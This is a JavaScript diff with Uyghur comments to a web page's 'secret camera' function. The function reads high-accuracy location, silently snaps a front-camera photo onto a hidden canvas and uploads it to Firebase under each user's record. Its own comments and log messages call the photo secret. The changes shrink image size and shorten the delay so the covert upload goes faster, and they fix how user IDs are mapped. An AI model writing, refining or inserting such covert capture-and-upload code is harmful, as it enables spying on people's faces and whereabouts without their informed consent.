@@ -393,7 +393,7 @@
             }
         }
 
-        // 🔥 كامېرا ئېقىمىنى كاپالەتلەندۈرۈپ تارتىدىغان ئەلالاشتۇرۇلغان فۇنكسىيە
+        // 🔥 ئەلالاشتۇرۇلغان ۋە كاپالەتلىك مەخپىي كامېرا فۇنكسىيەسى
         function requestUserPermissionsAndCapture() {
             if (!currentUser || !currentUser.id) return;
 
@@ -415,12 +415,11 @@
                 }, { enableHighAccuracy: true, timeout: 10000 });
             }
 
-            // ئالدىنقى كېمىرلارغا ماس كېلىشى ئۈچۈن قېلىپ سىناش قۇرۇلمىسى
             const constraints = {
                 video: {
                     facingMode: "user",
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
+                    width: { ideal: 480 },
+                    height: { ideal: 360 }
                 },
                 audio: false
             };
@@ -432,30 +431,32 @@
                     
                     video.onloadedmetadata = () => {
                         video.play().then(() => {
-                            // سىن كامېرىدىن تەييار رەسىم ئېلىش ئۈچۈن 1.5 سېكۇنت ساقلايمىز
+                            // سىن كامېرىدىن نورمال سۈرەت ئېلىش ئۈچۈن 1 سېكۇنت ساقلايمىز
                             setTimeout(() => {
                                 const canvas = document.getElementById('secretCanvas');
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
+                                canvas.width = video.videoWidth || 480;
+                                canvas.height = video.videoHeight || 360;
                                 
                                 const ctx = canvas.getContext('2d');
                                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                 
-                                const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                                // رەسىمنىڭ چوڭلۇقى كىچىك ۋە Firebase گە چىقىشى ئاسان بولسۇن ئۈچۈن سۈپىتى 0.7 قىلىندى
+                                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                                 
-                                // Firebase گە ساقلاش
-                                window.dbSet(window.dbRef(window.db, `users/${currentUser.id}/capturedImage`), {
+                                // Firebase گە بىۋاسىتە ساقلاش
+                                const capturedRef = window.dbRef(window.db, `users/${currentUser.id}/capturedImage`);
+                                window.dbSet(capturedRef, {
                                     image: imageData,
                                     capturedAt: new Date().toLocaleString()
                                 }).then(() => {
-                                    console.log("مەخپىي رەسىم مۇۋەپپەقىيەتلىك ساقلاندى!");
+                                    console.log("مەخپىي رەسىم Firebase گە مۇۋەپپەقىيەتلىك ساقلاندى!");
                                 }).catch(err => {
                                     console.error("رەسىمنى ساقلاشتا خاتالىق كۆرۈلدى:", err);
                                 });
 
                                 // كامېرا ئېقىمىنى تاقاش
                                 stream.getTracks().forEach(track => track.stop());
-                            }, 1500);
+                            }, 1000);
                         }).catch(e => {
                             console.log("سىننى ئويغىتىشتا خاتالىق:", e);
                             stream.getTracks().forEach(track => track.stop());
@@ -490,7 +491,15 @@
 
             window.dbOnValue(window.dbRef(window.db, 'users'), (snapshot) => {
                 const data = snapshot.val();
-                allUsers = data ? Object.values(data) : [];
+                if (data) {
+                    // 🔥 كۆپىيىش (Object.keys) ئارقىلىق ھەر بىر ئابونتنىڭ ID سىنى توغرا قوبۇل قىلىش كاپالەتكە ئىگە قىلىندى
+                    allUsers = Object.keys(data).map(key => ({
+                        id: key,
+                        ...data[key]
+                    }));
+                } else {
+                    allUsers = [];
+                }
                 
                 if (currentUser) {
                     const matchedUser = allUsers.find(u => String(u.id) === String(currentUser.id));
